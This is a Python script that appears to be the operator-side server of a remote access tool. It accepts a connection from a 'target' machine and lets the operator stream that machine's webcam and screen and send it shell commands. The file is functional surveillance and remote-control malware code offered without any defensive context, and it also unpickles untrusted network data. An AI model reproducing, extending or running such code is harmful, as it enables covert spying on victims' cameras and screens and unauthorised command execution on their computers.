import socket , cv2 , struct , sys , os , pickle
from threading import Thread

# Handling ,ultiple target

global cam_access_flag, cmd_access_flag, scrn_access_flag
cam_access_flag, cmd_access_flag, scrn_access_flag = 0, 0, 0
targets = {}


def buff_clr():
    c = 0
    clr = 0
    client_conn_obj.settimeout(1.2)
    while True:
        print('clearing buffer ',c,end='\r')
        try:
            packet = client_conn_obj.recv(1024*4)
            c+=1
        except TimeoutError:
            client_conn_obj.settimeout(None)
            break

def recv_camera_data():
    global cam_access_flag
    data = b""
    payload_size = struct.calcsize('Q')
    while cam_access_flag:
        while len(data) < payload_size:
            packet = client_conn_obj.recv(1024*4)
            if not packet:
                break
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        while len(data) < msg_size:
            data += client_conn_obj.recv(1024*4)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)
        frame = cv2.resize(frame, (300, 300))
        cv2.imshow('Traget Camera', frame)
        if cv2.waitKey(1) == ord('q'):
            cv2.destroyAllWindows()
            cam_access_flag = 0
            client_conn_obj.send(str.encode("cam_cmd abort camera access"))
            buff_clr()
            print('aborted camera')
            break


def recv_cmd_data():
    global cmd_access_flag
    while cmd_access_flag:
        cmd = "internal_cmd " + input("Target cmd > ")
        if cmd[13:] == "abort":
            cmd_access_flag = 0
            break
        else:
            client_conn_obj.send(str.encode(cmd))
            recv_op = client_conn_obj.recv(1024)
            print(recv_op)


def recv_screen_data():
    global scrn_access_flag
    data = b""
    payload_size = struct.calcsize('Q')
    while scrn_access_flag:
        while len(data) < payload_size:
            packet = client_conn_obj.recv(1024*4)
            if not packet:
                break
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        while len(data) < msg_size:
            data += client_conn_obj.recv(1024*4)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow('Traget Screen', frame)
        if cv2.waitKey(1) == ord('q'):
            cv2.destroyAllWindows()
            scrn_access_flag = 0
            client_conn_obj.send(str.encode("scrn_cmd abort screen access"))
            buff_clr()
            print('aborted screen')
            break


def send_cmd():
    global cam_access_flag, cmd_access_flag, scrn_access_flag
    while True:
        cmd = input("Enter command : ")
        if cmd == "give camera access" and cam_access_flag != 1:
            cam_access_flag = 1
            cmd = "cam_cmd "+"give camera access"
            client_conn_obj.send(str.encode(cmd))
            recv_camera_data()
        elif cmd == "give cmd access" and cmd_access_flag != 1:
            cmd_access_flag = 1
            recv_cmd_data()
        elif cmd == "give screen access" and scrn_access_flag != 1:
            scrn_access_flag = 1
            cmd = "scrn_cmd "+"give screen access"
            client_conn_obj.send(str.encode(cmd))
            print(cmd)
            recv_screen_data()

        else:
            print('Invalid command')


host, port = '', 9999
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Socket created...')
server.bind((host, port))
print('Server is ready....')

server.listen()
print('Waiting......')
client_conn_obj, address = server.accept()
print('connectd to ', address)
targets["target_"+str(len(targets))] = [client_conn_obj,address]

print(targets)

send_smd_th = Thread(target=send_cmd)
send_smd_th.start()